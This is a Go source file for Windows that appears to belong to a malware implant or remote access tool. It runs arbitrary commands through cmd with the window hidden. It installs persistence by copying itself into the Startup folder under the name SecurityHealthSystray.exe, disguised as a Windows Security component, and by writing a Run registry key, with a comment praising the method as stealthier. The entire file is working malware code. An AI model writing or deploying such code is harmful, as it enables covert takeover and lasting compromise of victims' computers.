//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func executeCommand(command string) ([]byte, error) {
	cmd := exec.Command("cmd", "/C", "chcp 65001 > nul && "+command)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	return cmd.CombinedOutput()
}

func installPersistence() (string, error) {
	exe, err := os.Executable()
	if err != nil {
		return "", err
	}

	destDir := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	destPath := destDir + "\\SecurityHealthSystray.exe"

	input, err := os.ReadFile(exe)
	if err != nil {
		return "", err
	}
	err = os.WriteFile(destPath, input, 0755)
	if err != nil {
		return "", err
	}

	// Add Registry persistence using native API (Stealthier than reg.exe)
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return fmt.Sprintf("File copied to Startup, but failed to open Registry key: %v", err), nil
	}
	defer k.Close()

	if err := k.SetStringValue("SecurityHealthSystray", destPath); err != nil {
		return fmt.Sprintf("File copied to Startup, but failed to write Registry value: %v", err), nil
	}

	return "Persistence installed to Startup & Registry: " + destPath, nil
}
